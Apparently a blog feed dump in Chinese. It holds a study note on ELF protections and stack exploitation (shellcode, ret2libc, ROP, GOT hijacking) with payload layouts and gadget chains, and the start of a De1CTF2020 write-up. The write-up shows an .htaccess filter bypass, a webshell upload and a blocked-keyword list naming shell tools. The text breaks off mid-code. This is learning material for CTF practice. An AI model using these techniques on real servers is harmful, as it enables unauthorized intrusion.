Programming，返回导向编程)</code>，利用栈溢出在栈上布置地址，每个内存地址对应一个<code>gadget</code>，利用<code>ret</code>等指令进行衔接来执行某项功能，最终达到pwn掉程序的目的。</p><p>看到网上师傅说：当<code>NX</code>保护开启，就表示题目给了<code>system（&#39;/bin/sh&#39;）</code>，如果关闭，表示你需要去构造<code>shellcode</code>。这个慢慢学吧。</p><h4 id="ALSR"><a href="#ALSR" class="headerlink" title="ALSR"></a>ALSR</h4><p><code>Address space layout randomization</code>，地址空间布局随机化。是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化将数据随机放置，增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p><p>但是地址随机化不是对所有模块和内存区都进行随机化，虽然<code>libc</code>、<code>栈</code>、<code>堆</code>的加载位置被随机化，但主镜像不会，这也是绕过的关键手段。</p><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p><code>Position-Independent Executable</code>， 位置无关可执行文件。与<code>ASLR</code>技术类似，<code>ASLR</code>将程序运行时的堆栈以及共享库的加载地址随机化, 而<code>PIE</code>技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。</p><p>这就意味着， 在<code>PIE</code>和<code>ASLR</code>同时开启的情况下， 攻击者将对程序的内存布局一无所知， 传统的改写<code>GOT</code>表项的方法也难以进行， 因为攻击者不能获得程序的<code>.got</code>段的虚地址。</p><h4 id="RPATH-RUNPATH"><a href="#RPATH-RUNPATH" class="headerlink" title="RPATH/RUNPATH"></a>RPATH/RUNPATH</h4><p>程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以<code>fake lib</code>造成攻击。参考<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.contextis.com%2Fen%2Fblog%2Flinux-privilege-escalation-via-dynamically-linked-shared-object-library">实例</a>。</p><h4 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h4><p>由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。加了这个保护之后,一些敏感函数如<code>read</code>, <code>fgets,memcpy</code>, <code>printf</code>等等可能导致漏洞出现的函数都会被替换成<code>__read_chk</code>，<code>__fgets_chk</code>，<code>__memcpy_chk</code>，<code>__printf_chk</code>等。</p><p>这些带了<code>chk</code>的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如<code>%n</code>之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接<code>%7$x</code>）等方式来避免漏洞出现。</p><p>以上就是了解到的PWN中常见的ELF文件的保护机制了，以后学习过程中逐步深入了解。</p><h3 id="关于寄存器"><a href="#关于寄存器" class="headerlink" title="关于寄存器"></a>关于寄存器</h3><p>在进行常用的一些技术学习之前，还需温习一下之前学过的关于寄存器的知识，毕竟是基础的基础。</p><p><code>32位x86</code>架构下的寄存器可以被简单分为<code>通用寄存器</code>和<code>特殊寄存器</code>两类，<code>通用寄存器</code>在大部分汇编指令下是可以任意使用的（虽然有些指令规定了某些寄存器的特定用途），而<code>特殊寄存器</code>只能被特定的汇编指令使用，不能用来任意存储数据。</p><p>通用寄存器包括：一般寄存器<code>eax</code>、<code>ebx</code>、<code>ecx</code>、<code>edx</code>，索引寄存器<code>esi、edi</code>，以及堆栈指针寄存器<code>esp、ebp</code>。其中各类寄存器的作用如下：</p><blockquote><p>一般寄存器：用来存储运行时数据，是指令最常用到的寄存器，除了存放一般性的数据，每个一般寄存器都有自己较为固定的独特用途。<code>eax</code>被称为<code>累加寄存器（Accumulator）</code>，用以进行算数运算和返回函数结果等。<code>ebx</code>被称为<code>基址寄存器（Base）</code>，在内存寻址时（比如数组运算）用以存放基地址。<code>ecx</code>被称为<code>记数寄存器（Counter）</code>，用以在循环过程中记数。<code>edx</code>被称为<code>数据寄存器（Data）</code>，常配合<code>eax</code>一起存放运算结果等数据。</p><p>索引寄存器：通常用于字符串操作中，<code>esi</code>指向要处理的<code>数据地址（Source Index）</code>，<code>edi</code>指向存放处理结果的<code>数据地址（Destination Index）</code>。</p><p>堆栈指针寄存器<code>esp</code>、<code>ebp</code>用于保存函数在调用栈中的状态，即<code>栈顶</code>和<code>栈底</code>。</p></blockquote><p>特殊寄存器包括：段地址寄存器<code>ss</code>、<code>cs</code>、<code>ds</code>、<code>es</code>、<code>fs</code>、<code>gs</code>，标志位寄存器<code>EFLAGS</code>，以及指令指针寄存器<code>eip</code>。</p><p>现代操作系统内存通常是以<code>分段</code>的形式存放不同类型的信息的。<code>函数调用栈</code>就是分段的一个部分（<code>Stack Segment</code>）。内存分段还包括<code>堆（Heap Segment）</code>、<code>数据段（Data Segment）</code>、<code>BSS段</code>以及<code>代码段（Code Segment）</code>。<br>代码段存储可执行代码和只读常量（如常量字符串），属性可读可执行，但通常不可写。数据段存储已经初始化且初值不为<code>0</code>的全局变量和静态局部变量，BSS段存储未初始化或初值为0的全局变量和静态局部变量，这两段数据都有可写的属性。堆用于存放程序运行中动态分配的内存，C语言中的<code>malloc()</code>和<code>free()</code>函数就是在堆上分配和释放内存。各段在内存的排列如下图所示：</p><p><img src="http://ggb0n.cool/images/jicunqi.png" alt=""></p><p>几种特殊寄存器用途如下：</p><blockquote><p>段地址寄存器：用来存储内存分段地址的，其中寄存器<code>ss</code>存储函数调用栈的地址，寄存器<code>cs</code>存储代码段的地址，寄存器<code>ds</code>存储数据段的地址，<code>es</code>、<code>fs</code>、<code>gs</code>是附加的存储数据段地址的寄存器。</p><p>标志位寄存器（EFLAGS）：32位中的大部分被用于标志数据或程序的状态，例如<code>OF（Overflow Flag）</code>对应数值溢出、<code>IF（Interrupt Flag）</code>对应中断、<code>ZF（Zero Flag）</code>对应运算结果为0、<code>CF（Carry Flag）</code>对应运算产生进位等。</p><p>指令指针寄存器（eip）：存储下一条运行指令的地址。</p></blockquote><p>了解了各类寄存器的用途，下面学习常用的漏洞利用方法手段。</p><h3 id="常用技术方法"><a href="#常用技术方法" class="headerlink" title="常用技术方法"></a>常用技术方法</h3><p>首先需要深入理解栈的工作原理，参考<a href="https://zhuanlan.zhihu.com/p/25816426">这里</a>。</p><p>在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是<code>eip</code>（存放下一条要执行指令的地址），所以我们的目标就是让<code>eip</code>载入攻击指令的地址。</p><p>如果要让<code>eip</code>指向攻击指令，需要做的工作：首先，在退栈过程中，返回地址会被传给<code>eip</code>，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。如下图：</p><p><img src="http://ggb0n.cool/images/tuizhan.png" alt=""></p><p>再来看看函数调用发生时，如果要让<code>eip</code>指向攻击指令，需要哪些准备？这时，<code>eip</code>会指向原程序中某个指定的函数，我们没法通过改写返回地址来控制，不过我们可以“偷梁换柱”－－将原本指定的函数在调用时替换为其他函数。</p><p>实现上述的攻击目的，主要有以下技术手段：</p><ul><li>1、<code>Shellcode</code>：修改返回地址，让其指向溢出数据中的一段指令</li><li>2、<code>Return2libc</code>：修改返回地址，让其指向内存中已有的某个函数</li><li>3、<code>ROP</code>：修改返回地址，让其指向内存中已有的一段指令</li><li>4、<code>Hijack GOT</code>：修改某个被调用函数的地址，让其指向另一个函数</li></ul><p>下面详细记录几种方法的学习：</p><h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><blockquote><p>修改返回地址，让其指向溢出数据中的一段指令</p></blockquote><p>该技术要完成的任务包括：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。<br>攻击指令一般都是用来打开shell，从而可以获得当前进程的控制权，所以这类指令片段也被成为<code>shellcode</code>。<code>shellcode</code>可以用汇编语言来写再转成对应的机器码，也可以上网搜索直接复制粘贴，以后深入学习。</p><p>溢出数据的组成如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; padding1 + address of shellcode + padding2 + shellcode</span><br></pre></td></tr></table></figure><p>其在栈内的分布如下图：</p><p><img src="http://ggb0n.cool/images/shellcode-zhan.png" alt=""></p><p>这里对溢出数据的组成详细说明一下：</p><blockquote><p><code>padding1</code>处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含<code>\x00</code>，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。<code>address of shellcode</code>是后面<code>shellcode</code>起始处的地址，用来覆盖返回地址。<code>padding2</code>处的数据也可以随意填充，长度可以任意。<code>shellcode</code>应该为十六进制的机器码格式。</p></blockquote><p>根据上面的构造，我们要解决以下两个问题：</p><blockquote><ul><li>1、 返回地址之前的填充数据<code>padding1</code>应该多长？</li></ul><p>我们可以用调试工具（例如<code>gdb</code>）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如<code>AAAA</code>覆盖，程序会终止并报错）。</p><ul><li>2、shellcode起始地址应该是多少？</li></ul><p>我们可以在调试工具里查看返回地址的位置（可以查看<code>ebp</code>的内容然后再加<code>4</code>（32位机），参见前面关于函数状态的链接），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的<code>shellcode</code>起始地址，解决办法是在<code>padding2</code>里填充若干长度的<code>\x90</code>。这个机器码对应的指令是<code>NOP(No Operation)</code>，也就是告诉CPU什么也不做，然后跳到下一条指令。有了这一段<code>NOP</code>的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到shellcode的起始处，所以这种方法被称为<code>NOP Sled</code>（中文含义是“滑雪橇”）。这样我们就可以通过增加<code>NOP</code>填充来配合试验shellcode起始地址。</p><p>另外，操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为<code>内存布局随机化</code>，即<code>Address Space Layout Randomization (ASLR)</code>），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成<code>core</code>文件，再通过调试工具在<code>core</code>文件中找到返回地址的位置，从而确定shellcode的起始地址。</p></blockquote><p>解决完上述问题，就可以拼接出最终的溢出数据，输入至程序来执行shellcode了。</p><p><img src="http://ggb0n.cool/images/shellcode-zhan2.png" alt=""></p><p>这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。这种情况包括<code>Return2libc</code>和<code>ROP</code>两种方法。</p><h4 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h4><blockquote><p>修改返回地址，让其指向内存中已有的某个函数</p></blockquote><p>该方法要完成的任务包括：在内存中确定某个函数的地址，并用其覆盖掉返回地址。<br>由于<code>libc</code>动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数，所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用<code>system</code>函数打开shell的完整形式为<code>system(“/bin/sh”)</code>，所以溢出数据也要包括必要的参数。<br>下面以执行<code>system(“/bin/sh”)</code>为例，先写出溢出数据的组成，再确定对应的各部分填充进去。</p><p>溢出数据组成如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; padding1 + address of system() + padding2 + address of “&#x2F;bin&#x2F;sh”</span><br></pre></td></tr></table></figure><p><img src="http://ggb0n.cool/images/r2libc1.png" alt=""></p><p>溢出数据各部分含义如下：</p><blockquote><p><code>padding1</code>处的数据可以随意填充（注意不要包含<code>\x00</code>，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。<code>address of system()</code>是<code>system</code>在内存中的地址，用来覆盖返回地址。<code>padding2</code>处的数据长度为<code>4</code>（32位机），对应调用<code>system</code>时的返回地址。因为我们在这里只需要打开shell就可以，并不关心从shell退出之后的行为，所以<code>padding2</code>的内容可以随意填充。<code>address of “/bin/sh”</code>是字符串<code>/bin/sh</code>在内存中的地址，作为传给<code>system</code>的参数。</p></blockquote><p>根据上面的构造，我们要解决以下两个问题：</p><blockquote><ul><li>1、返回地址之前的填充数据<code>padding1</code>应该多长？</li></ul><p>解决方法和<code>shellcode</code>中提到的答案一样。</p><ul><li>2、system函数地址应该是多少？</li></ul><p>首先要知道程序是如何调用动态链接库中的函数的：当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。<br>在<code>ASLR</code>被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看<code>system</code>的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。而当<code>ASLR</code>开启的时候，会将动态库加载的起始地址做随机化处理，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。</p><ul><li>3、<code>/bin/sh</code>的地址在哪里？</li></ul><p>可以在动态库里搜索字符串<code>/bin/sh</code>，如果存在，就可以按照<code>动态库起始地址＋相对偏移</code>来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过<code>getenv</code>等函数来确定地址。</p></blockquote><p>解决完上述问题，就可以拼接出溢出数据，输入至程序来通过<code>system</code>获取shell了。</p><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><blockquote><p>修改返回地址，让其指向内存中已有的一段指令</p></blockquote><p>该方法要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。<br>可是既然可以覆盖返回地址并定位到内存地址，为什么不直接用上篇提到的<code>return2libc</code>呢？因为有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配。这时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（将其称为<code>gadget</code>，意为小工具），溢出数据应该以下面的方式构造（padding长度和内容的确定方式参见上篇）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; padding + address of gadget</span><br></pre></td></tr></table></figure><p>溢出数据在栈中的分布如下图：<br><img src="http://ggb0n.cool/images/gadget1.png" alt=""></p><p>而如果想连续执行若干段指令，就需要每个<code>gadget</code>执行完毕可以将控制权交给下一个<code>gadget</code>。所以<code>gadget</code>的最后一步应该是<code>RET</code>指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为<code>返回导向编程（Return Oriented Programming）</code>。要执行多个<code>gadget</code>，溢出数据应该以下面的方式构造：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; padding + address of gadget 1 + address of gadget 2 + ...... + address of gadget n</span><br></pre></td></tr></table></figure><p>在这样的构造下，被调用函数返回时会跳转执行<code>gadget 1</code>，执行完毕时<code>gadget 1</code>的<code>RET</code>指令会将此时的栈顶数据（也就是<code>gadget 2</code>的地址）弹出至<code>eip</code>，程序继续跳转执行<code>gadget 2</code>，以此类推。</p><p>多个gadget的溢出数据在栈中分布如下：</p><p><img src="http://ggb0n.cool/images/gedget2.png" alt=""></p><p>现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以<code>ret</code>作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题：</p><blockquote><ul><li>1、栈溢出之后要实现什么效果？</li></ul><p><code>ROP</code>常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是<code>int 0x80</code>。执行这条指令时，被调用函数的编号应存入<code>eax</code>，调用参数应按顺序存入<code>ebx</code>，<code>ecx</code>，<code>edx</code>，<code>esi</code>，<code>edi</code>中。<br>例如，编号125对应函数：<code>mprotect (void *addr, size_t len, int prot)</code>，可用该函数将栈的属性改为可执行，这样就可以使用shellcode了。假如我们想利用系统调用执行这个函数，<code>eax</code>、<code>ebx</code>、<code>ecx</code>、<code>edx</code>应该分别为：<code>125</code>、<code>内存栈的分段地址</code>（可以通过调试工具确定）、<code>0x10000</code>（需要修改的空间长度，也许需要更长）、<code>7</code>（RWX 权限）。</p><ul><li>2、如何寻找对应的指令片段？</li></ul><p>有若干开源工具可以实现搜索以<code>ret</code>结尾的指令片段，著名的包括<code>ROPgadget</code>、<code>rp++</code>、<code>ropeme</code>等，甚至也可以用<code>grep</code>等文本匹配工具在汇编指令中搜索<code>ret</code>再进一步筛选。</p><ul><li>3、如何传入系统调用的参数？</li></ul><p>对于上面提到的<code>mprotect</code>函数，我们需要将参数传输至寄存器，可以用<code>pop</code>指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用<code>mov</code>指令来进行传输，不过写入数据再 <code>pop</code>要比先搜索再<code>mov</code>来的简单，如果要用<code>pop</code>指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个<code>gadget</code>，<code>pop</code>所传输的数据应该在 <code>gadget</code>地址之后，如下图所示。</p></blockquote><p><img src="http://ggb0n.cool/images/rop.png" alt=""></p><p>在调用<code>mprotect()</code>为栈开启可执行权限之后，我们希望执行一段shellcode，所以要将shellcode也加入溢出数据，并将shellcode的开始地址加到<code>int 0x80</code>的<code>gadget</code>之后。但确定shellcode在内存的确切地址是很困难的事，我们可以使用<code>push esp</code>这个<code>gadget</code>。<br><img src="http://ggb0n.cool/images/rop2.png" alt=""></p><p>我们假设现在内存中可以找到如下几条指令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eax; ret;    # pop stack top into eax</span><br><span class="line">pop ebx; ret;    # pop stack top into ebx</span><br><span class="line">pop ecx; ret;    # pop stack top into ecx</span><br><span class="line">pop edx; ret;    # pop stack top into edx</span><br><span class="line">int 0x80; ret;   # system call</span><br><span class="line">push esp; ret;   # push address of shellcode</span><br></pre></td></tr></table></figure><p>对于所有包含<code>pop</code>指令的<code>gadget</code>，在其地址之后都要添加<code>pop</code>的传输数据，同时在所有<code>gadget</code>最后包含一段shellcode，最终溢出数据结构应该变为如下格式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; padding + address of gadget 1 + param for gadget 1 + address of gadget 2 + param for gadget 2 + ...... + address of gadget n + shellcode</span><br></pre></td></tr></table></figure><p><img src="http://ggb0n.cool/images/rop3.png" alt=""></p><p>为了简单，假定输入溢出数据不受<code>\x00</code>字符的影响，所以payload可以直接包含<code>\x7d\x00\x00\x00</code>（传给<code>eax</code>的参数<code>125</code>）。如果希望实现更为真实的操作，可以用多个<code>gadget</code>通过运算得到上述参数。比如可以通过下面三条<code>gadget</code>来给<code>eax</code>传递参数：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eax; ret;         # pop stack top 0x1111118e into eax</span><br><span class="line">pop ebx; ret;         # pop stack top 0x11111111 into ebx</span><br><span class="line">sub eax, ebx; ret;    # eax -&#x3D; ebx</span><br></pre></td></tr></table></figure><p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。同时，由于<code>ROP</code>方法带来的灵活性，现在不再需要痛苦地试探shellcode起始地址了。回顾整个输入数据，只有栈的分段地址需要获取确定地址。如果利用<code>gadget</code>读取<code>ebp</code>的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了绕过内存随机化的可能。</p><p>实际搜索及拼接<code>gadget</code>时，并不会像上面一样顺利，有两个方面需要注意：</p><ul><li>1、很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条gadget：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop ebx; ret;</span><br></pre></td></tr></table></figure><p>但假如可以找到下面的gadget：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ebx, eax; ret;</span><br></pre></td></tr></table></figure><p>就可以将它和</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eax; ret;</span><br></pre></td></tr></table></figure><p>组合起来实现将数据传输给<code>ebx</code>的功能。上面提到的用多个gadget避免输入<code>\x00</code>也是一个实例应用。</p><ul><li>2、要小心gadget是否会破坏前面各个gadget已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心gadget对<code>ebp</code>和<code>esp</code>的操作，因为它们的变化会改变返回地址的位置，进而使后续的gadget无法执行。</li></ul><h4 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h4><blockquote><p>修改某个被调用函数的地址，让其指向另一个函数</p></blockquote><p>该方法要完成的任务包括：在内存中修改某个函数的地址，使其指向另一个函数。<br>为了便于理解，不妨假设修改<code>printf()</code>函数的地址使其指向<code>system()</code>，这样修改之后程序内对 <code>printf()</code>的调用就执行<code>system()</code>函数。要实现这个过程，我们就要弄清楚发生函数调用时程序是如何找到被调用函数的。</p><blockquote><p>程序对外部函数的调用需要在生成可执行文件时将外部函数链接到程序中，链接的方式分为<code>静态链接</code>和<code>动态链接</code>。静态链接得到的可执行文件包含外部函数的全部代码，动态链接得到的可执行文件并不包含外部函数的代码，而是在运行时将动态链接库（若干外部函数的集合）加载到内存的某个位置，再在发生调用时去链接库定位所需的函数。</p></blockquote><p>程序是如何在链接库内定位到所需的函数呢？</p><p>这个过程用到了两张表：<code>GOT</code>和<code>PLT</code>。GOT全称是<code>全局偏移量表（Global Offset Table）</code>，用来存储外部函数在内存的确切地址。GOT存储在数据段内，可以在程序运行中被修改。PLT全称是<code>程序链接表（Procedure Linkage Table）</code>，用来存储外部函数的<code>入口点（entry）</code>，换言之程序总会到PLT这里寻找外部函数的地址。PLT存储在代码段内，在运行之前就已经确定并且不会被修改，所以PLT并不会知道程序运行时动态链接库被加载的确切位置。那么PLT表内存储的入口点是什么呢？</p><p>就是GOT表中对应条目的地址：</p><p><img src="http://ggb0n.cool/images/got1.png" alt=""></p><p>外部函数的内存地址存储在GOT而非PLT表内，PLT存储的入口点又指向GOT的对应条目，那么程序为什么选择PLT而非GOT作为调用的入口点呢？<br>这样的设计是为了程序的运行效率。GOT表的初始值都指向PLT表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到PLT表内寻找对应的入口点，跳转到GOT表中。如果这是第一次调用这个函数，程序会通过GOT表再次跳转回PLT表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉GOT表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过PLT表跳转到GOT表，此时GOT表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p><p>第一次调用整个过程如下：</p><p><img src="http://ggb0n.cool/images/got2.png" alt=""></p><p>第二次调用整个过程如下：</p><p><img src="http://ggb0n.cool/images/got.png" alt=""></p><blockquote><p>上述实现遵循的是一种被称为<strong>LAZY</strong>的设计思想，它将需要完成的操作（解析外部函数的内存地址）留到调用实际发生时才进行，而非在程序一开始运行时就解析出全部函数地址。</p></blockquote><p>这个过程也启示了我们如何实现函数的伪装，那就是到GOT表中将函数A的地址修改为函数B的地址。这样在后面所有对函数A的调用都会执行函数B。<br>那么我们的目标可以分解为如下几部分：确定函数A在GOT表中的条目位置，确定函数B在内存中的地址，将函数B的地址写入函数A在GOT表中的条目。</p><ul><li>1、如何确定函数A在GOT表中的条目位置？</li></ul><p>程序调用函数时是通过PLT表跳转到GOT表的对应条目，所以可以在函数调用的汇编指令中找到PLT表中该函数的入口点位置，从而定位到该函数在GOT中的条目。例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call 0x08048430 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure><p>就说明<code>printf</code>在PLT表中的入口点是在<code>0x08048430</code>，所以<code>0x08048430</code>处存储的就是GOT表中<code>printf</code>的条目地址。</p><ul><li>2、如何确定函数B在内存中的地址？</li></ul><p>如果系统开启了内存布局随机化，程序每次运行动态链接库的加载位置都是随机的，就很难通过调试工具直接确定函数的地址。假如函数B在栈溢出之前已经被调用过，我们当然可以通过前一个问题的答案来获得地址。但我们心仪的攻击函数往往并不满足被调用过的要求，也就是GOT表中并没有其真实的内存地址。幸运的是，<strong>函数在动态链接库内的相对位置是固定的</strong>，在动态库打包生成时就已经确定。所以假如我们知道了函数A的运行时地址（读取 GOT 表内容），也知道函数A和函数B在动态链接库内的相对位置，就可以推算出函数B的运行时地址。</p><ul><li>3、如何实现 GOT 表中数据的修改？</li></ul><p>很难找到合适的函数来完成这一任务，不过我们还有强大的<code>ROP</code>。假设我们可以找到以下若干条gadget，就不难改写GOT表中数据，从而实现函数的伪装。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eax; ret; # printf@plt -&gt; eax</span><br><span class="line">mov ebx [eax]; ret;# printf@got -&gt; ebx</span><br><span class="line">pop ecx; ret; # addr_diff &#x3D; system - printf -&gt; ecx</span><br><span class="line">add [ebx] ecx; ret; # printf@got +&#x3D; addr_diff</span><br></pre></td></tr></table></figure><p>从修改GOT表的过程可以看出，这种方法也可以在一定程度上绕过内存随机化。</p><p>四种常见的方法学习完毕，还得多动手实践才好，以上内容均参考<a href="https://zhuanlan.zhihu.com/p/25892385">长亭师傅们的文章</a>，本文只是记录学习用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作为一名WEB菜狗，今天决定入坑二进制了，出于极大的好奇心和求知欲（其实就是自己太菜了，急需拓展知识啊~），加上也有些计算机原理的一些基础，想着不能把学的东西给废掉、扔掉，所以决定入坑！
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="二进制" scheme="http://ggb0n.cool/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="ELF文件保护机制" scheme="http://ggb0n.cool/tags/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF2020部分题解</title>
    <link href="http://ggb0n.cool/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>http://ggb0n.cool/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</id>
    <published>2020-05-02T02:07:36.000Z</published>
    <updated>2020-05-13T09:18:54.220Z</updated>
    
    <content type="html"><![CDATA[<p>这个比赛太考工作量，个人感觉知识量也比较大，另外De1ta的师傅们原来这么爱玩MC啊🤔，写一下几个题的题解，主要记录一下学到的东西。<a id="more"></a></p><h3 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h3><p>考察上传绕过，一是在上传<code>.htaccess</code>时对关键字进行绕过，二是在传马时对<code>&lt;?php</code>进行绕过</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>打开题目，随便上传个<code>php</code>的小马，回显如下：</p><p><img src="http://ggb0n.cool/images/de1ctf2.png" alt=""></p><p>php的后缀既然不行，那应该就是图片马了，八成是要用<code>.htaccess</code>解析，看一下响应头中服务器的架构：<code>Apache/2.4.6 (CentOS) PHP/5.4.16</code>，基本是确实是传<code>.htaccess</code>了</p><p>构造<code>.htaccess</code>将<code>jpg</code>进行解析：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>上传之后回显如下：</p><p><img src="http://ggb0n.cool/images/de1ctf1.png" alt=""></p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">perl|<span class="string">pyth</span>|<span class="string">ph</span>|<span class="string">auto</span>|<span class="string">curl</span>|<span class="string">base</span>|<span class="string">&gt;</span>|<span class="string">rm</span>|<span class="string">ruby</span>|<span class="string">openssl</span>|<span class="string">war</span>|<span class="string">lua</span>|<span class="string">msf</span>|<span class="string">xter</span>|telnet</span><br></pre></td></tr></table></figure><p>这些字段被ban了，不过<code>.htaccess</code>中可以用python换行时候一种解析语法：</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">AddType</span> <span class="string">application/x-httpd-p\</span></span><br><span class="line"><span class="attr">hp</span> <span class="string">.jpg</span></span><br></pre></td></tr></table></figure><p>上传的时候注意改<code>Content-Type</code>，如图：</p><p><img src="http://ggb0n.cool/images/de1ctf3.png" alt=""></p><p>如此便可以成功上传，然后传<code>jpg</code>的图片马就行了，注意图片马里的<code>&lt;?php</code>标签也需要绕过，可以用<code>&lt;?=</code>，如下图：</p><p><img src="http://ggb0n.cool/images/de1ctf4.png" alt=""></p><p>上传小马之后，拿到文件路径，传<code>system(&quot;cat /flag&quot;);</code>即可拿到flag。</p><h3 id="Hard-present-1"><a href="#Hard-present-1" class="headerlink" title="Hard_present_1"></a>Hard_present_1</h3><p>考察文件上传利用NTFS流绕过文件名检测、无字母数字shell构造、域渗透</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>进入题目，给出如下源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Clear the uploads directory every hour</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$sandbox = <span class="string">"uploads/"</span>. md5(<span class="string">"De1CTF2020"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span 